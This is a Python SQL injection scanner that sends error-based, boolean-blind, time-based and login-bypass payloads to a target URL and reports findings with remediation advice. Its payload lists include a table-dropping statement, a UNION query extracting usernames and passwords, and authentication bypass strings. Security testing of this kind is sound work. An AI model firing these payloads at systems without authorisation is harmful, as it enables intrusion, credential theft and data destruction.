"""
SQL Injection Vulnerability Scanner
=======================================
Tests web application input fields and URL parameters for SQL injection
vulnerabilities using multiple payload categories.

Detection Methods:
- Error-based: Looks for database error messages in responses
- Boolean-based blind: Compares responses with true/false conditions
- UNION-based: Attempts to extract data via UNION SELECT
- Time-based blind: Measures response time differences
- Authentication bypass: Tests login forms with bypass payloads

OWASP Reference: A03:2021 - Injection
CWE Reference: CWE-89 (SQL Injection)

ETHICAL USE ONLY: Only test systems you own or have written authorization to test.
"""

import re
import time
import requests
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs


@dataclass
class SQLiFinding:
    """Represents a SQL injection finding."""
    url: str
    parameter: str
    payload: str
    method: str  # GET or POST
    injection_type: str  # error-based, boolean-blind, union, time-based, auth-bypass
    severity: str  # Critical, High, Medium
    evidence: str
    description: str
    remediation: str
    owasp_category: str = 'A03:2021 - Injection'
    cwe_id: str = 'CWE-89'


@dataclass
class SQLiScanResult:
    """Complete result of an SQL injection scan."""
    target_url: str
    findings: List[SQLiFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    payloads_sent: int = 0
    vulnerabilities_found: int = 0
    scan_duration: float = 0.0
    errors: List[str] = field(default_factory=list)


# -----------------------------------------------------------------------
# SQL Injection Payloads organized by category
# -----------------------------------------------------------------------

# Error-based payloads - designed to trigger SQL syntax errors
ERROR_BASED_PAYLOADS = [
    "'",
    "''",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT NULL--",
    "') OR ('1'='1",
    "'; DROP TABLE users--",
    "1; SELECT * FROM users",
    "' AND 1=CONVERT(int, @@version)--",
    "' AND 1=1 UNION ALL SELECT 1,2,3--",
]

# Boolean-based blind payloads - true/false condition pairs
BOOLEAN_BLIND_PAYLOADS = [
    ("' AND '1'='1' --", "' AND '1'='2' --"),
    ("' AND 1=1 --", "' AND 1=2 --"),
    ("' OR 1=1 --", "' OR 1=2 --"),
    ("1' AND 1=1 --", "1' AND 1=2 --"),
    ("1 AND 1=1", "1 AND 1=2"),
]

# UNION-based payloads - attempt to extract data
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3,4,5,6,7,8--",
    "' UNION ALL SELECT username,password,3,4,5,6,7,8 FROM users--",
]

# Time-based blind payloads - cause delays if vulnerable
TIME_BASED_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",       # MSSQL
    "' OR SLEEP(3)--",                   # MySQL
    "'; SELECT pg_sleep(3)--",           # PostgreSQL
    "' OR 1=1; WAITFOR DELAY '0:0:3'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
]

# Authentication bypass payloads
AUTH_BYPASS_PAYLOADS = [
    ("' OR '1'='1' --", "anything"),
    ("' OR '1'='1'/*", "anything"),
    ("admin'--", ""),
    ("' OR 1=1--", "password"),
    ("' OR ''='", "' OR ''='"),
    ("admin' #", ""),
    ("admin'/*", ""),
    ("' OR 1=1 LIMIT 1--", "anything"),
    ("') OR ('1'='1'--", "anything"),
    ("' OR '1'='1' OR ''='", "anything"),
]

# SQL error patterns to detect in responses
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"microsoft ole db provider",
    r"microsoft sql server",
    r"odbc sql server driver",
    r"sqlite3\.operationalerror",
    r"sqlite\.error",
    r"near \".*\": syntax error",
    r"pg_query\(\): error",
    r"postgresql.*error",
    r"ora-\d{5}",
    r"oracle error",
    r"db2 sql error",
    r"sql syntax.*mysql",
    r"database error",
    r"sql error",
    r"syntax error at or near",
    r"operationalerror",
    r"programmingerror",
    r"integrityerror",
    r"dataerror",
    r"invalid column name",
    r"unknown column",
    r"no such column",
    r"column.*does not exist",
    r"table.*doesn't exist",
    r"no such table",
]

# Compile regex patterns for performance
COMPILED_ERROR_PATTERNS = [
    re.compile(pattern, re.IGNORECASE) for pattern in SQL_ERROR_PATTERNS
]


def _check_sql_errors(response_text: str) -> Optional[str]:
    """Check response text for SQL error messages."""
    for pattern in COMPILED_ERROR_PATTERNS:
        match = pattern.search(response_text)
        if match:
            return match.group(0)
    return None


def _test_error_based(
    url: str,
    param_name: str,
    method: str = 'POST',
    timeout: int = 10,
    verbose: bool = False
) -> List[SQLiFinding]:
    """
    Test for error-based SQL injection.
    Sends payloads and checks for SQL error messages in the response.
    """
    findings = []

    for payload in ERROR_BASED_PAYLOADS:
        try:
            if method.upper() == 'POST':
                response = requests.post(
                    url,
                    data={param_name: payload},
                    timeout=timeout,
                    allow_redirects=False
                )
            else:
                response = requests.get(
                    url,
                    params={param_name: payload},
                    timeout=timeout,
                    allow_redirects=False
                )

            error_match = _check_sql_errors(response.text)

            if error_match:
                finding = SQLiFinding(
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    method=method,
                    injection_type='error-based',
                    severity='Critical',
                    evidence=f"SQL error detected: '{error_match}'",
                    description=(
                        f"Error-based SQL injection found in parameter '{param_name}'. "
                        f"The application returns database error messages when malformed "
                        f"SQL is injected, confirming the input is incorporated into "
                        f"a SQL query without proper sanitization."
                    ),
                    remediation=(
                        "Use parameterized queries (prepared statements) instead of "
                        "string concatenation. Implement input validation and use "
                        "an ORM. Never expose raw database errors to users."
                    ),
                )
                findings.append(finding)

                if verbose:
                    print(f"  [!] SQLi FOUND (error-based): {param_name}={payload}")
                    print(f"      Evidence: {error_match}")

                # Stop after first confirmed finding for this parameter
                break

            if verbose:
                print(f"  [.] Tested: {param_name}={payload[:40]}...")

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"  [!] Request error: {str(e)[:60]}")

    return findings


def _test_boolean_blind(
    url: str,
    param_name: str,
    method: str = 'POST',
    timeout: int = 10,
    verbose: bool = False
) -> List[SQLiFinding]:
    """
    Test for boolean-based blind SQL injection.
    Compares responses between true and false conditions.
    """
    findings = []

    for true_payload, false_payload in BOOLEAN_BLIND_PAYLOADS:
        try:
            if method.upper() == 'POST':
                true_response = requests.post(
                    url,
                    data={param_name: true_payload},
                    timeout=timeout,
                    allow_redirects=False
                )
                false_response = requests.post(
                    url,
                    data={param_name: false_payload},
                    timeout=timeout,
                    allow_redirects=False
                )
            else:
                true_response = requests.get(
                    url,
                    params={param_name: true_payload},
                    timeout=timeout,
                    allow_redirects=False
                )
                false_response = requests.get(
                    url,
                    params={param_name: false_payload},
                    timeout=timeout,
                    allow_redirects=False
                )

            # Compare response lengths - significant difference indicates vulnerability
            len_diff = abs(len(true_response.text) - len(false_response.text))
            status_diff = true_response.status_code != false_response.status_code

            if len_diff > 100 or status_diff:
                finding = SQLiFinding(
                    url=url,
                    parameter=param_name,
                    payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                    method=method,
                    injection_type='boolean-blind',
                    severity='High',
                    evidence=(
                        f"Response difference detected: "
                        f"length diff={len_diff} bytes, "
                        f"status diff={status_diff} "
                        f"(true={true_response.status_code}, "
                        f"false={false_response.status_code})"
                    ),
                    description=(
                        f"Boolean-based blind SQL injection found in parameter "
                        f"'{param_name}'. The application produces different responses "
                        f"for true and false SQL conditions, allowing an attacker to "
                        f"extract data one bit at a time."
                    ),
                    remediation=(
                        "Use parameterized queries (prepared statements). "
                        "Implement proper input validation. Use stored procedures. "
                        "Apply the principle of least privilege for database accounts."
                    ),
                )
                findings.append(finding)

                if verbose:
                    print(f"  [!] SQLi FOUND (boolean-blind): {param_name}")
                    print(f"      True payload: {true_payload}")
                    print(f"      False payload: {false_payload}")
                    print(f"      Length diff: {len_diff} bytes")

                break

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"  [!] Request error: {str(e)[:60]}")

    return findings


def _test_time_based(
    url: str,
    param_name: str,
    method: str = 'POST',
    timeout: int = 15,
    delay_threshold: float = 2.5,
    verbose: bool = False
) -> List[SQLiFinding]:
    """
    Test for time-based blind SQL injection.
    Measures response time differences with sleep payloads.
    """
    findings = []

    # Get baseline response time
    try:
        start = time.time()
        if method.upper() == 'POST':
            requests.post(url, data={param_name: 'test'}, timeout=timeout)
        else:
            requests.get(url, params={param_name: 'test'}, timeout=timeout)
        baseline_time = time.time() - start
    except requests.exceptions.RequestException:
        return findings

    for payload in TIME_BASED_PAYLOADS:
        try:
            start = time.time()
            if method.upper() == 'POST':
                requests.post(
                    url,
                    data={param_name: payload},
                    timeout=timeout
                )
            else:
                requests.get(
                    url,
                    params={param_name: payload},
                    timeout=timeout
                )
            elapsed = time.time() - start

            if elapsed - baseline_time > delay_threshold:
                finding = SQLiFinding(
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    method=method,
                    injection_type='time-based',
                    severity='High',
                    evidence=(
                        f"Response delay detected: {elapsed:.2f}s "
                        f"(baseline: {baseline_time:.2f}s, "
                        f"difference: {elapsed - baseline_time:.2f}s)"
                    ),
                    description=(
                        f"Time-based blind SQL injection found in parameter "
                        f"'{param_name}'. The application response was delayed "
                        f"by {elapsed - baseline_time:.1f} seconds when a sleep "
                        f"payload was injected, confirming SQL execution."
                    ),
                    remediation=(
                        "Use parameterized queries (prepared statements). "
                        "Implement query timeouts. Use an ORM for database access. "
                        "Validate and sanitize all user inputs."
                    ),
                )
                findings.append(finding)

                if verbose:
                    print(f"  [!] SQLi FOUND (time-based): {param_name}={payload}")
                    print(f"      Delay: {elapsed:.2f}s (baseline: {baseline_time:.2f}s)")

                break

        except requests.exceptions.Timeout:
            # A timeout might also indicate a successful time-based injection
            finding = SQLiFinding(
                url=url,
                parameter=param_name,
                payload=payload,
                method=method,
                injection_type='time-based',
                severity='Medium',
                evidence="Request timed out - possible time-based injection",
                description=(
                    f"Possible time-based blind SQL injection in parameter "
                    f"'{param_name}'. The request timed out when a sleep payload "
                    f"was injected, which may indicate SQL execution."
                ),
                remediation=(
                    "Use parameterized queries. Implement query timeouts. "
                    "Investigate the parameter for injection vulnerabilities."
                ),
            )
            findings.append(finding)
            break
        except requests.exceptions.RequestException:
            continue

    return findings


def _test_auth_bypass(
    login_url: str,
    username_param: str = 'username',
    password_param: str = 'password',
    timeout: int = 10,
    verbose: bool = False
) -> List[SQLiFinding]:
    """
    Test login form for SQL injection authentication bypass.
    """
    findings = []

    # Get the normal failed login response for comparison
    try:
        normal_response = requests.post(
            login_url,
            data={username_param: 'nonexistentuser', password_param: 'wrongpassword'},
            timeout=timeout,
            allow_redirects=False
        )
        normal_length = len(normal_response.text)
        normal_status = normal_response.status_code
    except requests.exceptions.RequestException:
        return findings

    for username_payload, password_payload in AUTH_BYPASS_PAYLOADS:
        try:
            response = requests.post(
                login_url,
                data={
                    username_param: username_payload,
                    password_param: password_payload
                },
                timeout=timeout,
                allow_redirects=False
            )

            # Check for authentication bypass indicators
            bypassed = False
            evidence_parts = []

            # Check for redirect (successful login often redirects)
            if response.status_code in [301, 302, 303, 307, 308]:
                bypassed = True
                location = response.headers.get('Location', 'unknown')
                evidence_parts.append(
                    f"Redirect to '{location}' (status {response.status_code})"
                )

            # Check for significant response difference
            len_diff = abs(len(response.text) - normal_length)
            if len_diff > 200 and response.status_code != normal_status:
                bypassed = True
                evidence_parts.append(
                    f"Response changed significantly (diff: {len_diff} bytes)"
                )

            # Check for SQL errors
            error_match = _check_sql_errors(response.text)
            if error_match:
                evidence_parts.append(f"SQL error: '{error_match}'")
                # Error alone doesn't mean bypass, but still a finding
                if not bypassed:
                    finding = SQLiFinding(
                        url=login_url,
                        parameter=username_param,
                        payload=f"user={username_payload}, pass={password_payload}",
                        method='POST',
                        injection_type='error-based',
                        severity='High',
                        evidence=f"SQL error in login form: {error_match}",
                        description=(
                            "SQL injection detected in the login form. While "
                            "authentication bypass was not confirmed, SQL errors "
                            "indicate the input is used unsafely in queries."
                        ),
                        remediation=(
                            "Use parameterized queries for authentication. "
                            "Hash passwords with bcrypt or argon2. "
                            "Never expose database errors to users."
                        ),
                    )
                    findings.append(finding)

            if bypassed:
                finding = SQLiFinding(
                    url=login_url,
                    parameter=f"{username_param}/{password_param}",
                    payload=f"user='{username_payload}', pass='{password_payload}'",
                    method='POST',
                    injection_type='auth-bypass',
                    severity='Critical',
                    evidence=" | ".join(evidence_parts),
                    description=(
                        "SQL injection authentication bypass confirmed. An attacker "
                        "can log in as any user without knowing the password by "
                        "injecting SQL code into the login form. This grants "
                        "unauthorized access to user accounts including admin."
                    ),
                    remediation=(
                        "Use parameterized queries (prepared statements) for all "
                        "authentication queries. Hash passwords using bcrypt, scrypt, "
                        "or argon2. Implement account lockout and rate limiting. "
                        "Use multi-factor authentication."
                    ),
                )
                findings.append(finding)

                if verbose:
                    print(f"  [!] AUTH BYPASS FOUND!")
                    print(f"      Username: {username_payload}")
                    print(f"      Password: {password_payload}")
                    print(f"      Evidence: {' | '.join(evidence_parts)}")

                break

            if verbose:
                print(f"  [.] Tested: user={username_payload[:30]}...")

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"  [!] Request error: {str(e)[:60]}")

    return findings


def scan_sqli(
    target_url: str,
    endpoints: Optional[List[Dict]] = None,
    timeout: int = 10,
    verbose: bool = False
) -> SQLiScanResult:
    """
    Run a comprehensive SQL injection scan against the target.

    Args:
        target_url: Base URL of the target application
        endpoints: List of endpoint configurations to test.
                   Each dict: {path, method, params: [param_names]}
                   If None, uses default endpoints.
        timeout: Request timeout in seconds
        verbose: Enable verbose output

    Returns:
        SQLiScanResult with all findings
    """
    start_time = time.time()

    result = SQLiScanResult(target_url=target_url)

    # Default endpoints to test if none provided
    if endpoints is None:
        endpoints = [
            {
                'path': '/login',
                'method': 'POST',
                'params': ['username', 'password'],
                'is_login': True,
                'username_param': 'username',
                'password_param': 'password',
            },
            {
                'path': '/search',
                'method': 'POST',
                'params': ['query'],
                'is_login': False,
            },
            {
                'path': '/search',
                'method': 'GET',
                'params': ['q'],
                'is_login': False,
            },
        ]

    print("[*] Starting SQL Injection scan...")
    print(f"[*] Target: {target_url}")
    print(f"[*] Endpoints to test: {len(endpoints)}")
    print()

    for endpoint in endpoints:
        url = urljoin(target_url, endpoint['path'])
        method = endpoint.get('method', 'POST')
        params = endpoint.get('params', [])
        is_login = endpoint.get('is_login', False)

        result.endpoints_tested += 1

        print(f"[*] Testing: {method} {url}")
        print(f"    Parameters: {', '.join(params)}")

        # Test authentication bypass for login forms
        if is_login:
            print("  [*] Testing authentication bypass...")
            auth_findings = _test_auth_bypass(
                login_url=url,
                username_param=endpoint.get('username_param', 'username'),
                password_param=endpoint.get('password_param', 'password'),
                timeout=timeout,
                verbose=verbose,
            )
            result.findings.extend(auth_findings)
            result.payloads_sent += len(AUTH_BYPASS_PAYLOADS)

        # Test each parameter
        for param in params:
            # Error-based testing
            print(f"  [*] Error-based testing: {param}")
            error_findings = _test_error_based(
                url, param, method, timeout, verbose
            )
            result.findings.extend(error_findings)
            result.payloads_sent += len(ERROR_BASED_PAYLOADS)

            # Boolean-based blind testing
            print(f"  [*] Boolean-blind testing: {param}")
            boolean_findings = _test_boolean_blind(
                url, param, method, timeout, verbose
            )
            result.findings.extend(boolean_findings)
            result.payloads_sent += len(BOOLEAN_BLIND_PAYLOADS) * 2

            # Time-based blind testing (slower, so done last)
            print(f"  [*] Time-based testing: {param}")
            time_findings = _test_time_based(
                url, param, method, timeout, verbose=verbose
            )
            result.findings.extend(time_findings)
            result.payloads_sent += len(TIME_BASED_PAYLOADS)

        print()

    result.vulnerabilities_found = len(result.findings)
    result.scan_duration = time.time() - start_time

    print(f"[*] SQL Injection scan complete")
    print(f"[*] Duration: {result.scan_duration:.2f}s")
    print(f"[*] Payloads sent: {result.payloads_sent}")
    print(f"[*] Vulnerabilities found: {result.vulnerabilities_found}")

    return result


if __name__ == '__main__':
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:5000'
    result = scan_sqli(target, verbose='--verbose' in sys.argv)

    if result.findings:
        print("\n" + "=" * 60)
        print("  SQL INJECTION FINDINGS")
        print("=" * 60)
        for i, finding in enumerate(result.findings, 1):
            print(f"\n  Finding #{i}")
            print(f"  Type: {finding.injection_type}")
            print(f"  Severity: {finding.severity}")
            print(f"  URL: {finding.url}")
            print(f"  Parameter: {finding.parameter}")
            print(f"  Payload: {finding.payload}")
            print(f"  Evidence: {finding.evidence}")
